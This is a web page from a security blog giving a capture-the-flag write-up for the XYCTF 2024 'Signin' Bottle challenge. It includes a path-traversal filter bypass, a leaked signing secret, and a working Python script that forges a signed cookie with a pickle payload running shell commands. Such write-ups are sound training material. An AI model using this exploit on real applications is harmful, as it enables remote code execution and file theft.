@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越) | Blue Star's Blog</title><meta name="author" content="Neuroblue"><meta name="copyright" content="Neuroblue"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="首先代码审计，这是一个利用 Bottle 写的 Web 框架。 &#x2F;download 支持下载文件，作了路径穿越过滤 &#x2F;secret 进行了 guest 和 admin 的认证，用了 session &#x3D; request.get_cookie(&quot;name&quot;, secret&#x3D;secret) 而源码里告诉了路径 ..&#x2F;..&#x2F;secret.txt 也就是说可以用 se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)">
+<meta property="og:url" content="https://bluestar-34.github.io/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Blue Star&#39;s Blog">
+<meta property="og:description" content="首先代码审计，这是一个利用 Bottle 写的 Web 框架。 &#x2F;download 支持下载文件，作了路径穿越过滤 &#x2F;secret 进行了 guest 和 admin 的认证，用了 session &#x3D; request.get_cookie(&quot;name&quot;, secret&#x3D;secret) 而源码里告诉了路径 ..&#x2F;..&#x2F;secret.txt 也就是说可以用 se">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bluestar-34.github.io/img/5.jpg">
+<meta property="article:published_time" content="2025-07-24T09:27:50.000Z">
+<meta property="article:modified_time" content="2025-07-24T09:29:21.676Z">
+<meta property="article:author" content="Neuroblue">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bluestar-34.github.io/img/5.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)",
+  "url": "https://bluestar-34.github.io/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+  "image": "https://bluestar-34.github.io/img/5.jpg",
+  "datePublished": "2025-07-24T09:27:50.000Z",
+  "dateModified": "2025-07-24T09:29:21.676Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Neuroblue",
+      "url": "https://bluestar-34.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/B.png"><link rel="canonical" href="https://bluestar-34.github.io/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hacker1.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/nav1.jpg" alt="Logo"><span class="site-name">Blue Star's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-24T09:27:50.000Z" title="Created 2025-07-24 17:27:50">2025-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-24T09:29:21.676Z" title="Updated 2025-07-24 17:29:21">2025-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>首先代码审计，这是一个利用 Bottle 写的 Web 框架。</p>
+<p>&#x2F;download 支持下载文件，作了路径穿越过滤</p>
+<p>&#x2F;secret 进行了 guest 和 admin 的认证，用了 <code>session = request.get_cookie(&quot;name&quot;, secret=secret)</code></p>
+<p>而源码里告诉了路径 <code>../../secret.txt</code></p>
+<p>也就是说可以用 secret.txt 对 cookie 进行伪造</p>
+<p>根据提示，有反序列化的过程，session 认后也没有其他可用功能，于是去看 bottle 如何解析cookie</p>
+<p>看到他的 get_cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line"></span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line"></span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>
+<p><code>dst = pickle.loads(base64.b64decode(msg))</code>  存在一个明显的 pickle 反序列化漏洞</p>
+<p>那么思路就清晰了</p>
+<p>文件读取出 secret.txt，脚本伪造恶意 cookie，携带 cookie 访问 &#x2F;secret 触发 bottle 反序列化进行 RCE，后面可以继续用 download 来读取文件</p>
+<p>而路径穿越过滤 <code> if &#39;../../&#39; in name or name.startswith(&#39;/&#39;) or name.startswith(&#39;../&#39;) or &#39;\\&#39; in name:</code></p>
+<p>可以用  <code>./.././../</code> 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">download?filename=./.././../secret.txt</span><br><span class="line"></span><br><span class="line">Hell0_H@cker_Y0u_A3r_Sm@r7</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 Bottle 框架提取的函数</span></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s.decode(enc, err)</span><br><span class="line">    <span class="keyword">return</span> unicode(<span class="string">&quot;&quot;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> s)</span><br><span class="line"> </span><br><span class="line">secret = <span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span></span><br><span class="line"><span class="comment"># pickle 反序列化漏洞函数 执行 eval</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag* &gt; /hack&#x27;)&quot;</span>, ))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5000-cee08b39-e4ae-4163-8c03-90e95b350a31.challenge.ctfplus.cn/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoded = base64.b64encode(pickle.dumps(&#123;<span class="string">&#x27;name&#x27;</span>: Exploit()&#125;, -<span class="number">1</span>))</span><br><span class="line">sig = base64.b64encode(hmac.new(tob(secret), encoded, hashlib.sha256).digest())</span><br><span class="line">value = touni(tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + encoded)</span><br><span class="line"></span><br><span class="line">route1 = <span class="string">&quot;secret&quot;</span></span><br><span class="line">route2 = <span class="string">&quot;download?filename=./.././../hack&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;name=&quot;</span> + value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response1 = requests.get(url + route1, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response1.text)</span><br><span class="line">response2 = requests.get(url + route2)</span><br><span class="line"><span class="comment"># print(response2.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;404&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response2.text:</span><br><span class="line">    <span class="built_in">print</span>(response2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个生成 cookie 的脚本逻辑主要是看原 bottle 框架里 set_cookie 里逻辑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encoded = base64.b64encode(pickle.dumps([name, value], -<span class="number">1</span>))</span><br><span class="line">sig = base64.b64encode(hmac.new(tob(secret), encoded,</span><br><span class="line">                                digestmod=digestmod).digest())</span><br><span class="line">value = touni(tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + encoded)</span><br></pre></td></tr></table></figure>
+<p>其中 touni 与 tob 函数都在源码里有</p>
+<p>携带  <code>Cookie:name=!SkyF7oSFKnYCTuloMmFAj4orPxbD114ygeUhFjtYCqc=?gAWVTgAAAAAAAABdlCiMBG5hbWWUjAhidWlsdGluc5SMBGV2YWyUk5SMJ19faW1wb3J0X18oJ29zJykuc3lzdGVtKCdscyAvID4gL2hhY2snKZSFlFKUZS4=</code></p>
+<p>然后访问 &#x2F;secret ，回显 error</p>
+<p>再访问 <code>download?filename=./.././../hack</code> 得到 flag</p>
+<p>源码 main.py</p>
+<pre><code class="python"># -*- encoding: utf-8 -*-
+from bottle import Bottle, request, response, redirect, static_file, run, route
+with open(&#39;../../secret.txt&#39;, &#39;r&#39;) as f:
+    secret = f.read()
+
+app = Bottle()
+@route(&#39;/&#39;)
+def index():
+    return &#39;&#39;&#39;HI&#39;&#39;&#39;
+@route(&#39;/download&#39;)
+def download():
+    name = request.query.filename
+    if &#39;../../&#39; in name or name.startswith(&#39;/&#39;) or name.startswith(&#39;../&#39;) or &#39;\\&#39; in name:
+        response.status = 403
+        return &#39;Forbidden&#39;
+    with open(name, &#39;rb&#39;) as f:
+        data = f.read()
+    return data
+
+@route(&#39;/secret&#39;)
+def secret_page():
+    try:
+        session = request.get_cookie(&quot;name&quot;, secret=secret)
+        if not session or session[&quot;name&quot;] == &quot;guest&quot;:
+            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;
+            response.set_cookie(&quot;name&quot;, session, secret=secret)
+            return &#39;Forbidden!&#39;
+        if session[&quot;name&quot;] == &quot;admin&quot;:
+            return &#39;The secret has been deleted!&#39;
+    except:
+        return &quot;Error!&quot;
+run(host=&#39;0.0.0.0&#39;, port=8080, debug=False)
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://bluestar-34.github.io">Neuroblue</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://bluestar-34.github.io/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://bluestar-34.github.io/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/24/Labs-NodeCeption-neuro/" title="Labs_NodeCeption_neuro"><img class="cover" src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Labs_NodeCeption_neuro</div></div><div class="info-2"><div class="info-item-1">外部打点arp-scan -l 12345678910111213┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:74:07:c6, IPv4: 192.168.0.9Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.0.1     30:3f:7b:d5:aa:de       Shenzhen YOUHUA Technology Co., Ltd192.168.0.8     2c:9c:58:8e:96:a5       (Unknown)192.168.0.12    08:00:27:08:28:cf       PCS Systemtechnik GmbH192.168.0.4     f2:13:09:db:48:25       (Unknown: locally administered)192.168.0.2    ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/24/Labs-NodeCeption-neuro/" title="Labs_NodeCeption_neuro"><img class="cover" src="/img/4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-24</div><div class="info-item-2">Labs_NodeCeption_neuro</div></div><div class="info-2"><div class="info-item-1">外部打点arp-scan -l 12345678910111213┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:74:07:c6, IPv4: 192.168.0.9Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.0.1     30:3f:7b:d5:aa:de       Shenzhen YOUHUA Technology Co., Ltd192.168.0.8     2c:9c:58:8e:96:a5       (Unknown)192.168.0.12    08:00:27:08:28:cf       PCS Systemtechnik GmbH192.168.0.4     f2:13:09:db:48:25       (Unknown: locally administered)192.168.0.2    ...</div></div></div></a><a class="pagination-related" href="/2025/07/22/catcat-new%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98-flaskSession-%E4%BC%AA%E9%80%A0%EF%BC%89/" title="catcat-new（文件读取内存 + flaskSession 伪造）"><img class="cover" src="/img/5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-22</div><div class="info-item-2">catcat-new（文件读取内存 + flaskSession 伪造）</div></div><div class="info-2"><div class="info-item-1">点击猫猫信息看到文件读取功能  环境变量里没有 1http://61.147.171.103:60316/info?file=../../../../proc/self/environ  /proc/self/cmdline，用于获取当前启动进程的完整命令 得到   b’python\x00app.py\x00’ 再次读取上级目录的 ..&#x2F;app.py app是个Flask对象，而secret...</div></div></div></a><a class="pagination-related" href="/2025/07/22/ez-curl%EF%BC%88http-header%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90-exprees-%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%88%AA%E6%96%AD%EF%BC%89/" title="ez_curl（http-header格式解析 + exprees 请求参数截断）"><img class="cover" src="/img/8.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-22</div><div class="info-item-2">ez_curl（http-header格式解析 + exprees 请求参数截断）</div></div><div class="info-2"><div class="info-item-1">首先看 js 的 express 框架 12345678910111213app.get(&#x27;/flag&#x27;, (req, res) =&gt; &#123;    if(!req.query.admin.includes(&#x27;false&#x27;) &amp;&amp; req.headers.admin.includes(&#x27;true&#x27;))&#123;        res.send(flag);    &#125;else&#123;        res.send(&#x27;try hard&#x27;);    &#125;&#125;);  必须满足查询参数中不包含 flase，请求头有 admin:true  （这里的请求头是 post 中的请求头） 再看 web php 代码 $input = file_get_contents(&#39;php://input&#39;); 这里是直接获取的 post 内容 $headers = (array)json_decode($input)-&gt;headers; 将一个...</div></div></div></a><a class="pagination-related" href="/2025/04/15/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现"><img class="cover" src="/img/6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-15</div><div class="info-item-2">XYCTF2024复现</div></div><div class="info-2"><div class="info-item-1">warm up123456789101112131415161718192021222324252627&lt;?phpinclude &#x27;next.php&#x27;;highlight_file(__FILE__);$XYCTF = &quot;Warm up&quot;;extract($_GET);if (isset($_GET[&#x27;val1&#x27;]) &amp;&amp; isset($_GET[&#x27;val2&#x27;]) &amp;&amp; $_GET[&#x27;val1&#x27;] != $_GET[&#x27;val2&#x27;] &amp;&amp; md5($_GET[&#x27;val1&#x27;]) == md5($_GET[&#x27;val2&#x27;])) &#123;    echo &quot;ez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;    die(&quot;什么情况,这么基础的md5做不来&quot;);&#125;if...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Neuroblue</div><div class="author-info-description">BBBBBBBlue.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bluestar-34/Bluestar-34.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a lonely blue star.</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)"/></a><div class="content"><a class="title" href="/2025/07/24/XYCTF-2024-Signin-Bottle%E6%A1%86%E6%9E%B6Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)">XYCTF_2024_Signin_(Bottle框架Pickle反序列化+路径穿越)</a><time datetime="2025-07-24T09:27:50.000Z" title="Created 2025-07-24 17:27:50">2025-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/24/Labs-NodeCeption-neuro/" title="Labs_NodeCeption_neuro"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Labs_NodeCeption_neuro"/></a><div class="content"><a class="title" href="/2025/07/24/Labs-NodeCeption-neuro/" title="Labs_NodeCeption_neuro">Labs_NodeCeption_neuro</a><time datetime="2025-07-24T05:44:28.000Z" title="Created 2025-07-24 13:44:28">2025-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/22/hexo-%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" title="hexo 操作指南"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo 操作指南"/></a><div class="content"><a class="title" href="/2025/07/22/hexo-%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" title="hexo 操作指南">hexo 操作指南</a><time datetime="2025-07-22T07:11:21.000Z" title="Created 2025-07-22 15:11:21">2025-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/22/ez-curl%EF%BC%88http-header%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90-exprees-%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%88%AA%E6%96%AD%EF%BC%89/" title="ez_curl（http-header格式解析 + exprees 请求参数截断）"><img src="/img/8.png" 